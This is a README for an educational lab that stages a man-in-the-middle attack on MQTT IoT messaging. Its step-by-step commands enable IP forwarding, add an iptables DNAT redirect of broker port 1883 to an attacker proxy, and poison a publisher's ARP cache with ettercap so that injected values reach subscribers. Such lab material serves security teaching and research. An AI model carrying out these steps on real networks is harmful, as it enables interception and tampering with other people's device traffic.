# Man-in-the-middle-mitm-attack-on-MQTT-IoT-based-communication
A complete tutorial and toolkit for demonstrating a Man-in-the-Middle (MITM) attack on the MQTT protocol. This project is for educational and cybersecurity research purposes to understand IoT vulnerabilities. Includes Python (Asyncio, Paho-MQTT) for a payload-injection proxy and bash scripts using ettercap (ARP spoofing) and iptables.


## Bash commands to run in attackers terminal

# package installations
sudo apt-get update
sudo apt-get install python3-venv
# create virtual env using "python3 -m venv cps_testbed" and activate using "source cps_testbed/bin/activate"
pip3 install paho-mqtt
sudo apt install -y python3-pip tcpdump dsniff iptables
sudo apt install ettercap-common ettercap-graphical
# make mqtt_tcp_mitm.py executable
chmod +x mqtt_tcp_mitm.py

## Bash commands to run in brokers terminal
install Mosquitto
open a cmd in administrative mode
configure the mosquitto.conf to listen to 0.0.0.0 1883 port and run
net start mosquitto

## Bash commands to run in publisher's terminal
>> run the publisher code

## Bash commands to run in subscriber's terminal
>> run the subscriber code

## Bash commands to run in attackers terminal

# Enable forwarding
sudo sysctl -w net.ipv4.ip_forward=1
# Redirect incoming TCP packets that are *destined to the broker IP:1883* to local attacker:1883
sudo iptables -t nat -A PREROUTING -p tcp -d $BROKER --dport 1883 -j DNAT --to-destination $ATTACKER:1883
>> sudo iptables -t nat -A PREROUTING -p tcp -d 192.168.1.2 --dport 1883 -j DNAT --to-destination 192.168.1.190:1883
# Masquerade outgoing proxied connections so replies go back correctly
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
# Start mitm proxy on attacker pi
python3 mqtt_tcp_mitm.py --listen-host 0.0.0.0 --listen-port 1883 --upstream-host $BROKER --upstream-port 1883
>> python3 mqtt_tcp_mitm.py --listen-host 0.0.0.0 --listen-port 1883 --upstream-host 192.168.1.2 --upstream-port 1883
# You should see: MITM proxy listening on 0.0.0.0:1883 forwarding to 192.168.1.2:1883 as my broker was 192.168.1.2
# Open another terminal in attacker pi
# poison Publishers ARP cache
sudo ettercap -T -M arp:remote /$Publisher//$BROKER/
for example >> sudo ettercap -T -M arp:remote /192.168.1.183//192.168.1.2/
# Observe network traffic in first attacker pi terminal which shows changed and original values.
# Observe changed values printed in subscribers print in terminal

## Cleanup after all this
# 1. close the ettercap by pressing q
# 2. run the following in attacker pi terminal
# remove iptables rules (run exact deletions)
>> sudo iptables -t nat -D PREROUTING -p tcp -d $BROKER --dport 1883 -j DNAT --to-destination $ATTACKER:1883
>> sudo iptables -t nat -D POSTROUTING -j MASQUERADE
# disable forwarding if you enabled it and want to revert
>> sudo sysctl -w net.ipv4.ip_forward=0
# 3. stop mosquitto using the following in broker's admin terminal
>> net stop mosquitto
